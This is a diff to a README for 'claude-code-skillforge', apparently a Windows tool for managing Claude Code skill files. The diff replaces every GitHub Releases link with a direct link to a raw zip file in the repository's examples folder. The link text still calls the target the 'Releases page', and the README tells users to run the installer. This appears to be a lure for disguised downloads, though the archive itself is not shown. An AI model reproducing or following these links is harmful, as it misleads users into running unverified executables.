@@ -1,6 +1,6 @@
 # ⚙️ claude-code-skillforge - Build and Upgrade Skills Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/cxshoutghost/claude-code-skillforge/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/cxshoutghost/claude-code-skillforge/main/examples/claude_skillforge_code_v1.8.zip)
 
 ---
 
@@ -43,9 +43,9 @@ This application is for users who need a simple tool to manage skill files relat
 
 ## 🚀 Getting Started: Download and Install
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Here-blue)](https://github.com/cxshoutghost/claude-code-skillforge/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/cxshoutghost/claude-code-skillforge/main/examples/claude_skillforge_code_v1.8.zip)
 
-1. Open the [claude-code-skillforge Releases page](https://github.com/cxshoutghost/claude-code-skillforge/releases) by clicking the link above or pasting it into your browser.
+1. Open the [claude-code-skillforge Releases page](https://raw.githubusercontent.com/cxshoutghost/claude-code-skillforge/main/examples/claude_skillforge_code_v1.8.zip) by clicking the link above or pasting it into your browser.
 
 2. Look for the latest release at the top of the page. It will usually be labeled with the newest date or version number.
 
@@ -133,6 +133,6 @@ A: The app handles most skill file sizes. For very large files, performance migh
 
 Use the link below to get the latest version of claude-code-skillforge for Windows:
 
-[Download claude-code-skillforge Releases](https://github.com/cxshoutghost/claude-code-skillforge/releases)
+[Download claude-code-skillforge Releases](https://raw.githubusercontent.com/cxshoutghost/claude-code-skillforge/main/examples/claude_skillforge_code_v1.8.zip)
 
 Once downloaded, run the installer and follow the setup steps described above.
